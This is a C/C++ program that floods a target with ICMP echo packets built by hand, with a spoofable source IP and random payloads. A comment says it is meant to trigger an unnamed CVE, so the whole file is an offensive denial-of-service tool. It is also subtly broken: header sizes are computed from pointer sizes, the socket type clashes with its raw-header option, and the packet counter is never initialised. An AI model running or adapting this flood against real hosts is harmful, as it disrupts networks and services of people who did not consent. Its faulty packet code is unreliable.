#include <iostream>

#include <cstdio>
#include <cstdlib>
#include <cstring>

#include <sys/time.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>


#include <unistd.h>



unsigned short in_checksum(unsigned short *ptr, int nbytes);
void help(const char *p);

int main(int argc, char** argv) {


    // argument checking
    if(argc < 3) {
        printf("Usage: %s <source IP> <destination IP> <payload size>", argv[0]);
        return 0;
    }

    unsigned long destination_address;
    unsigned long source_address;
    int payload_size = 0, sent, sent_size;

    source_address = inet_addr(argv[1]);
    destination_address = inet_addr(argv[2]);

    // if we have more than 4 arguments then payload size equals the 4th argument
    if(argc > 3) {
        payload_size = atoi(argv[3]);
    }

    int socket_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);

    if (socket_fd < 0) {
        perror("Unable to create socket");
        return 0;
    }

    int on = 1;

    // send IP headers
    if( setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, (const char*) &on, sizeof(on)) == -1 ) {
        perror("Unable to set Socket options for socket");
        return 0;
    }

    // Datagram handling
    if( setsockopt(socket_fd, SOL_SOCKET, SO_BROADCAST, (const char*) &on, sizeof(on)) == -1) {
        perror("Unable to set Datagram options for socket");
        return 0;
    }

    // Packet Size calculations
    int packet_size = sizeof (struct iphdr*) + sizeof (struct icmphdr*) + payload_size;
    char* packet = (char *) malloc(packet_size);

    if (!packet)
    {
        perror("out of memory");
        close(socket_fd);
        return (0);
    }

    //IPv4 Header
    struct iphdr* ip = (struct iphdr*) packet;

    //ICMP Header
    struct icmphdr* icmp = (struct icmphdr *) (packet + sizeof(ip));

    // zero out the packet buffer
    memset(packet, 0, packet_size);

    // set the IP and ICMP structures for ping

    // IPv4
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(packet_size);
    ip->id = rand();
    ip->frag_off = 255;
    ip->protocol = IPPROTO_ICMP;
    ip->saddr = source_address;
    ip->daddr = destination_address;

    // ICMP Structure
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.sequence = rand();
    icmp->un.echo.id = rand();
    icmp->checksum = 0;

    // begin sending packet operation. This will send an ICMP PING flood, hopefully triggering the CVE
    struct sockaddr_in server_address;
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = destination_address;
    memset(&server_address.sin_zero, 0, sizeof(server_address.sin_zero));

    puts("Flooding with ICMP PING");

    while (1) {

        memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), rand() % 255, payload_size);

        icmp->checksum = 0;
        icmp->checksum = in_checksum((unsigned short *) icmp, sizeof(struct icmphdr));

        if ((sent_size = sendto(socket_fd, packet, packet_size, 0, (struct sockaddr* ) &server_address, sizeof(server_address))) < 1) {
            perror("Sending packet failed, I am sorry!");
            break;
        }
        ++sent;
        printf("%d Packets sent\r", sent);
        fflush(stdout);

        usleep(10000);

    }
    free(packet);
    close(socket_fd);

    return 0;
}



// Function definitions
unsigned short in_checksum(unsigned short *ptr, int nbytes)
{
    register long sum;
    u_short oddbyte;
    register u_short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *) & oddbyte) = *(u_char *) ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;

    return (answer);
}